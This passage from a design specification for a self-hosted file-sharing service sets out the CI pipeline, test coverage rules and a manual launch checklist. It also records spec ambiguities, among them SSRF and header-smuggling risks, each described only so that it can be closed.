T-LIMIT-21 · T-AUDIT-09 · T-OPS-03 · T-OPS-04 · T-OPS-05 · T-OPS-06 · T-OPS-07 · every §14.20
performance target · and the nightly one-million-case runs of F1–F7.

### The release gate

An instance may be trusted with real client material only when **every** `T-PRIV-*` and
`T-SEC-*` case passes on the actual deployment target — not on a developer machine — and §14.23's
manual checklist is signed off with a date and a name.

## 14.22 CI pipeline

### 14.22.1 Stages

| # | Stage | Runs | Fails the build on |
| --- | --- | --- | --- |
| 0 | **Lint and static** | `ruff`, `mypy --strict`, the clock lint, the SQL-`now()` lint, the entropy lint, `bandit`, a dependency audit | any finding |
| 1 | **Unit** | All unit-level cases, `-n auto` | any failure; coverage below §14.22.3 |
| 2 | **Schema** | `alembic upgrade head`/`downgrade base`/`upgrade head`; index and constraint presence (T-OPS-09) | any drift between the migration output and Part 3 |
| 3 | **Integration** | Real Postgres + Redis + file root; the whole `T-*` integration set | any failure |
| 4 | **Reflection gates** | T-SEC-00 (negative trio per route), T-LIMIT-01 (bucket registry), T-AUDIT-01's completeness assertion, T-MCP-02 (API/MCP parity), T-CLI-01 | an uncovered route, bucket, action, or capability |
| 5 | **Security** | Every `@security` case at every level | **any failure, unconditionally** (§14.22.4) |
| 6 | **e2e** | Real Caddy, real TLS, headless Chromium | any failure |
| 7 | **Property/fuzz (short)** | F1–F7 at 10,000 cases each, plus the committed corpus | any crash or property violation |
| 8 | **Performance (smoke)** | The five bolded §14.20 targets at 10% of full load | a regression over 20% against the recorded baseline |
| 9 | **Package** | Build the CLI, build the deploy artefact | — |

Stages 0–7 run on every commit to every branch. Stage 8 runs on every commit to `main` and on
every pull request that touches `authorize`, `can_view`, resolution, or the serving path.

### 14.22.2 Per-commit versus nightly

**Per commit:** stages 0–7, plus stage 8 where triggered. Target under 12 minutes wall clock with
parallelism; if it exceeds 20 minutes the fix is more parallelism, never a reduced suite.

**Nightly:** the full performance suite of §14.20 on real target hardware; F1–F7 at 1,000,000
cases; the suite run twice under two different `--random-order-seed` values; a full
backup/restore round trip (T-OPS-03) against a fresh VM; a 24-hour soak posting and serving
continuously with the collection, expiry, trash, and prune jobs on their real cadences, asserting
zero reference-count drift (T-VER-08's reconciliation query at the end) and zero leaked `.part`
files; and a dependency vulnerability scan.

**Weekly:** the 2 GB video range-request suite and the 5,000-file posting target at full size.

### 14.22.3 Coverage thresholds

| Scope | Threshold |
| --- | --- |
| `authorize()` (§6.5) | **100% branch** |
| `can_view()` (§6.5) | **100% branch** — all four returns and every actor/artifact combination |
| `normalise_path()` (§6.4) | **100% branch** — every one of the seven rules' reject paths |
| `resolve_longest_prefix()` (§6.5.1) | **100% branch** |
| `resolve_entry_path()` (§5.5) | 100% branch |
| Scope enforcement (`require()`) | 100% branch |
| Rate-limit and quota modules | 95% branch |
| Everything else | 85% line, 75% branch |

Branch coverage on the four bolded functions is enforced with **no exclusion pragmas permitted**
— a `# pragma: no cover` anywhere in those functions fails stage 0. Coverage may not decrease
between commits on `main`.

### 14.22.4 The security rule

1. **A failing `@security` test blocks the merge.** There is no override, no "known failure"
   list, no `xfail`, and no branch exemption. A security test that must change because the design
   changed is changed in the same commit as the design, with the reason in the commit message.
2. **An unrun security test is a failed security test.** Stage 5 records the count of collected
   `@security` cases and compares it to a checked-in expected count. A drop — from a collection
   error, a skipped module, a broken import, an accidental `-k` filter, or an environment that
   could not start — fails the stage with the same severity as an assertion failure. "The
   security suite did not run" is never a green build.
3. **A security test may not be deleted without deleting the feature it protects.** Removing a
   `@security` case requires a matching removal in the route table or the spec, verified by
   stage 4's reflection gates.
4. **The nine `T-PRIV-*` cases are additionally pinned by ID.** Stage 5 asserts all nine node IDs
   were collected and passed. Renaming one to something not matching `T-PRIV-0[1-9]` fails.
5. Flakiness policy: a non-security test that flakes is quarantined for at most 5 working days
   with an owner and an issue, then fixed or deleted. **A security test may never be
   quarantined**; a flaky one is treated as a live defect in the system under test until proven
   otherwise, because the failure mode of a flaky authorisation check is an intermittently open
   door.

## 14.23 Manual verification checklist

Automated tests cover the machine. This is the short list a human confirms **once**, on the real
instance, before the first piece of real client material goes near it. Sign and date it in
`DECISIONS.md`.

1. **The door is where you think it is.** From a phone on cellular data, with no VPN, open
   `https://share.c52.com/` and confirm you are asked to sign in. Then open a known artifact URL
   while signed out and confirm you get a plain not-found page, not a login prompt and not a
   "you don't have access" message.
2. **A passkey actually signs you in on a second device.** Not the machine you registered on. If
   this does not work, you have one credential and no recovery path.
3. **Two passkeys exist, and the recovery code is somewhere that is not this machine.** Print it
   or put it in a different vault. Confirm the first-run checklist shows complete.
4. **Send yourself a share link from a different network.** Open it in a private window on a
   device that has never signed in. Confirm the artifact renders, images and stylesheets load,
   and the URL bar shows `/s/…` and never your artifact's name.
5. **Password-gate a link and read the password aloud to someone.** If the generated password is
   ambiguous over the phone, that is a copy bug worth finding now.
6. **Revoke that link while the other person has it open, then have them reload.** They should see
   the "no longer active" page immediately. This is P9 with a human on the other end.
7. **Check your inbox.** Creating the link should have emailed you. If it did not, notifications
   are misconfigured and you will not learn when an agent shares something.
8. **Give an agent a token and ask it to share something.** It must fail, and it must tell you
   exactly which scope it lacks. Confirm the failure message is one you would understand at
   11 p.m.
9. **Post from the agent, then overwrite it, then roll back.** Confirm the URL never changed and
   the old version is still there.
10. **Delete something and get it back.** Then confirm its share links did *not* come back.
11. **Look at the audit log for the last hour** and confirm you can answer, from it alone, "what
    of mine became reachable without a sign-in today, and who did it".
12. **Watch a video artifact and scrub it.** Seeking must be instant. If it is not, `Range` is not
    reaching Caddy.
13. **Pull the plug.** Reboot the server. Confirm everything comes back without intervention and
    a certificate renewal is not pending.
14. **Restore last night's backup onto a scratch host** and open one artifact from it. A backup
    you have never restored is a hypothesis.
15. **Confirm disk encryption is actually on**, and that the backup destination is not on the same
    machine.
16. **Search for a phrase you know is inside a document you posted.** It must not be found. That
    is P5, and it is the thing you are trading for.

## 14.24 Spec ambiguities found while writing these tests

Recorded per §1.9. Each entry states the conflict with section numbers, the rule applied, and the
resolution the tests encode. All are logged in `DECISIONS.md` as `D-14-nn`.

**A1 — `handle /mcp*` swallows artifact names beginning `mcp`.** §6.3 reserves the exact name
`mcp`, but the Caddyfile in §2.4 routes `/mcp*` as a prefix, so an artifact legitimately named
`mcpserver` or `mcp-notes` would be proxied to the MCP endpoint and never resolve — a name the
API accepted at post time silently 404s at serve time. *Rules 2 and 3.* **Resolution:** the
Caddyfile route becomes `handle /mcp` plus `handle /mcp/*`; `/mcp*` is removed. The reserved list
in §6.3 is unchanged. F2 asserts no accepted name is captured by any Caddy route prefix, so this
class of bug cannot return when a route is added. Tested by T-POST-15 and T-SERVE-02.

**A2 — which URL is canonical in an API response.** §6.2 says `/~robert/postcal` is canonical and
that both forms resolve for the root user; §5.4 and §5.8 show `url` as the short form; §7.7 says
a grantee reaches the artifact "at its canonical URL". Unspecified: what `url` contains when the
artifact is returned to someone other than its owner. *Rule 1.* **Resolution:** `url` is the
short form only when the recipient of the response **is** the owning root user; in every other
response — grantee listings, `?shared=true`, MCP results for another user's artifact — it is the
`~handle` form. A recipient viewing through a link never receives a `url` field at all. Tested by
T-SHARE-14 and T-SERVE-02.

**A3 — an `entryPath` that is not in the manifest.** §5.4's field table and §5.5 rule 1 both
assume the explicit path exists; neither says what happens otherwise, and §5.12 has no code for
it. §5.9 has the same gap for `PATCH`. *Rules 1 and 2.* **Resolution:** asymmetric, and
deliberately so. At **post** time it falls through to rules 2–5 and returns an
`entry_path_not_found` **warning** — a post must not fail on a metadata nicety when the response
already carries a `warnings` array. At **`PATCH`** time it is `422 invalid_entry_path`, a new
code added to §5.12, because the caller is being explicit and synchronous and there is no
warnings channel. Tested by T-POST-14 and T-POST-23.

**A4 — `maxViews` counts something that is only estimated.** §7.3 defines `maxViews` as "burn
after N distinct viewer-days", but the only distinct-viewer machinery in the system is the
HyperLogLog of §3.8/§10.6, which is an **estimate**, and §3.7 gives `share_link` a `view_count`
column with no stated unit. Burning a capability on an approximation is not acceptable. *Rules 1
and 3.* **Resolution:** two separate quantities. `share_link.view_count` is defined as the count
of **authorised artifact responses** served through that link, for display only. A new exact
integer `share_link.viewer_days` counts distinct `(day, viewer_hash)` pairs, maintained via a
Redis set per link-day and folded into the column at the 60-second flush; `maxViews` compares
against that. The HLL remains for the owner-facing viewer estimate and is never used for
enforcement. Tested by T-SHARE-13.

**A5 — "live" is used in three places with two meanings.** §7.8 derives `shared` from "at least
one live link"; §7.5 says enforcement is the inline `expires_at` check while `revoked_at` lags up
to five minutes; §6.5's `can_view` calls `actor.link.live()` without defining it. *Rule 1.*
**Resolution:** one definition everywhere — a link is live iff `revoked_at IS NULL AND
expires_at > clock.now()`. A grant is live iff `revoked_at IS NULL`. Derived `visibility` uses
the same predicate, so an expired-but-unswept link reads as `private`, not `shared`. Tested by
T-SHARE-16 and T-EXP-02.

**A6 — `seq` is assigned at declare but constrained at commit.** §5.4 phase 1 returns `seq: 2` in
the declare response, while §3.4 enforces `UNIQUE (artifact_id, seq)` on rows that only appear at
commit. Two concurrent declares against one artifact both compute `seq: 2`, and the second commit
raises a constraint violation that has no error code in §5.12 — a `500`. *Rule 2.* **Resolution:**
`seq` is assigned **at commit**, inside the transaction, as `max(seq) + 1` under a row lock on the
artifact. The declare response's `seq` is documented as provisional and the commit response's is
authoritative. Concurrent commits therefore both succeed with distinct sequences and a
deterministic final `live_version_id` (last committer wins). Tested by T-POST-06 and T-POST-07.

**A7 — `sharectl panic` and grants.** §10.5 says panic "revokes every share link on the instance,
kills every recipient session"; it is silent on `share_grant`. Rule 1 argues for revoking grants
too. *Rules 1 and 2, in tension.* **Resolution:** panic does **not** revoke grants, and this is
the one place in this part where rule 1 was not followed literally. The reasoning: panic exists
for a leaked bearer credential (§10.5's two stated risks are both about links), a grant requires
an authenticated account on this instance and cannot be forwarded (§3.7), and revocation is
irreversible in the §5.11 sense — restoring does not re-open access, so a panicked grant would
silently break legitimate collaboration with no undo. Instead, the panic summary email
**enumerates every live grant** so the operator can revoke deliberately. Tested by T-OPS-06.

**A8 — the collection query contradicts its own prose.** §3.6 states `ref_count` is advisory and
that `NOT EXISTS` is authoritative, then writes a query whose `WHERE` includes
`f.ref_count <= 0`. A counter that has drifted **high** on an unreferenced file makes that file
permanently uncollectable — a slow leak the prose says cannot happen. *Rule 1.* **Resolution:**
the query stays exactly as written. Conservative is correct: a leak costs disk, and removing the
counter from the predicate would make a drifted-low counter on a **referenced** file rely on
`NOT EXISTS` alone, which is a much worse failure if the subquery is ever mis-joined. The remedy
is `sharectl recompute-refs`, plus a nightly log line counting rows where
`ref_count > 0 AND NOT EXISTS (…)` so the leak is visible rather than silent. Tested by T-VER-09
and T-OPS-07.

**A9 — `share_post_from_urls` versus "no SSRF surface at all".** §2.9 states flatly that Share
"makes no outbound request on behalf of published content — there is no proxying feature, so
there is no SSRF surface at all", and §1.6.1 rests part of the public-hostname argument on it.
§9.3's `share_post_from_urls` has the server fetch caller-supplied URLs, which is a
textbook SSRF surface reaching `169.254.169.254`, loopback Postgres and Redis, and `file://`.
This is the sharpest contradiction in the spec. *Rule 1, decisively.* **Resolution:** the server
never dereferences a caller-supplied URL. `share_post_from_urls` keeps its name and signature but
its implementation changes: it performs the declare, returns the signed upload URLs paired with
the caller's source URLs, and the **agent** fetches and uploads. §2.9's claim stays literally
true, and no allowlist, resolver pinning, or redirect policy has to exist — which is rule 3 as
well. Tested by T-MCP-05, which asserts zero outbound sockets from the API process.

**A10 — `allowFraming` and `csp` exist only in Part 6.** §6.6.6 describes both as post-time
artifact properties, but neither appears in §5.4's declare field table, §5.9's `PATCH` list,
§5.8's item shape, or §3.4's `artifact` table. *Rule 2.* **Resolution:** add
`allow_framing boolean NOT NULL DEFAULT false` and `csp text` to `artifact`, both settable at
declare and via `PATCH`, both present in the item shape. `allowFraming` is ignored with a
`framing_ignored_password_link` warning when the request arrives through a password-protected
link, per §6.6.6. Tested by T-SEC-14.

**A11 — warning codes have no catalogue.** Seven warning strings appear across the spec —
`shadowing_name` (§6.5.1), `no_entry_point` (§5.5), `ttl_with_live_links` (§8.5),
`archive_ratio_exceeded`'s advisory sibling, the §10.5 phishing heuristic, plus
`entry_path_not_found` and `framing_ignored_password_link` added above — with no stable list, no
shape, and no statement that they are part of the contract. `422 dotfile_rejected` (§6.4 step 7)
is likewise missing from §5.12's error table. *Rule 2.* **Resolution:** warnings are
`{code, message, detail}` objects with the same stability guarantee as error codes, catalogued in
§5.12 alongside the errors, and `dotfile_rejected` is added to that table. The phishing warning's
code is `possible_credential_form`. Tested by T-POST-14, T-SEC-02, T-SEC-15, T-SEC-30.

**A12 — can you purge something already in the trash?** §5.11 presents `?purge=true` as an
alternative to trashing; §8.4 and §4.6.1 describe `artifacts:delete` as "purge from trash".
*Rule 2.* **Resolution:** one code path. `DELETE /api/v1/artifacts/{name}?purge=true` works
whether the artifact is live or trashed, and is the only permanent-deletion route. Tested by
T-TRASH-06 and T-PRIV-08.

**A13 — what is `SHARE_MAX_SHARE_TTL` measured from?** §7.3 caps `ttl` at it; §7.4 says extending
adds to the current expiry. Extending repeatedly by small amounts could otherwise carry a link
past the maximum indefinitely, defeating the point of P4's expiry-as-control argument in §1.6.4.
*Rule 1.* **Resolution:** the cap is on total lifetime — `expires_at - created_at` may never
exceed `SHARE_MAX_SHARE_TTL`. An extension that would breach it is `422 ttl_too_long`. A link
that has reached the cap must be replaced, which is the correct outcome: a new link, a new audit
record, a new notification. Tested by T-SHARE-12.

**A14 — `/internal/authorize` returning `401` is an existence oracle.** §2.4.1's response table
includes `401` meaning "recipient must enter a password", but `forward_auth` only runs for
root-space and user-space artifact paths (§2.4 routes `/s/*` straight to the API). A `401` on
`/postcal` would tell an unauthenticated stranger that `postcal` exists and is link-shared with a
password — a direct P1 violation. *Rule 1.* **Resolution:** `/internal/authorize` returns only
`200`, `404`, `429`, or `503`. The `401` row is removed from §2.4.1; password gates arise solely
inside the `/s/*` handler, which does not use `forward_auth`. Tested by T-SERVE-11 and
T-SHARE-01, whose matrix asserts `404` — never `401` — for every non-recipient actor.

**A15 — recipient cookie names can collide.** §4.7 derives the cookie name from the token's first
8 characters and §3.7 stores the same 8 characters as `display_prefix`. Two live links sharing a
prefix would produce two cookies with the same name at overlapping paths. The probability is
negligible (58⁸ ≈ 1.3 × 10¹⁴) but the failure is silent cross-link cookie confusion. *Rule 1.*
**Resolution:** link creation retries token generation while the 8-character prefix already
exists among that instance's live links, making collision impossible rather than unlikely; the
session row's `share_link_id` check remains as the second layer. Tested by T-SEC-07 and
T-SHARE-06.

**A16 — the view hash's inputs are under-specified.** §10.6 requires that "the same visitor across
two artifacts produces unlinkable hashes", which is only true if the artifact is an input to the
hash; §3.7's `recipient_session.ip_hash` is described as "a salted daily hash" with no such
input. *Rule 1.* **Resolution:** view hashes are
`HMAC(key = view_salt ‖ utc_date, msg = artifact_id ‖ client_ip)`; recipient-session hashes are
`HMAC(key = view_salt ‖ utc_date, msg = share_link_id ‖ client_ip)`. Both are unlinkable across
targets and unrecomputable after the day rolls over. Tested by T-PRIV-06.

**A17 — API paths cannot express a name containing a slash.** §5.3 permits `q3/market-report` and
§5.8 addresses artifacts as `/api/v1/artifacts/{name}`, so `/api/v1/artifacts/q3/market-report/links`
is ambiguous between artifact `q3` with sub-resource `market-report/links` and artifact
`q3/market-report` with sub-resource `links`. §6.5.1's longest-prefix rule solves this for
serving but not for the API, where the sub-resource is a suffix rather than the remainder.
*Rules 2 and 3.* **Resolution:** slashes in names are percent-encoded in API path segments —
`/api/v1/artifacts/q3%2Fmarket-report/links` — decoded exactly once, with any residual `%`
rejected, matching §6.4's single-decode discipline. Every `{name}` endpoint's test set is
parameterised over a slashed name so the encoding is exercised everywhere rather than on the one
endpoint someone remembered. Tested across T-PRIV-07, T-POST-23, and T-SHARE-14.

**A18 — Part 16 does not exist and the phase count disagrees with the inventory.**
`inventory.md` assigns screens to phases 1–3; §1.11 names Part 16 as the phasing document; the
brief for this part specifies four phases. *Rule 2.* **Resolution:** §14.21 infers a fourth
phase covering the screenless operational work, states the inference explicitly, and declares
that Part 16 governs once written. Recorded as `D-14-PHASE`.

**A19 — a minor one, recorded so it is not rediscovered.** §2.4's Caddyfile strips
`X-Share-File`, `X-Share-Artifact`, and `X-Share-Actor` from client requests, but `copy_headers`
lists eight `X-Share-*` headers, five of which are never stripped on the way in
(`X-Share-Content-Type`, `X-Share-Cache-Control`, `X-Share-Disposition`, `X-Share-CSP`,
`X-Share-Frame-Options`, `X-Share-Version`). A client sending `X-Share-CSP:` on an artifact
request could reach the API. It cannot change the outcome, because the API constructs its own
response headers and Caddy re-emits from the **response**, not the request — but relying on that
is fragile. *Rule 1.* **Resolution:** strip **all** `X-Share-*` request headers at the edge with
`request_header -X-Share-*`, not an enumerated subset. Tested by T-SEC-05, which sends every one
of the eight.
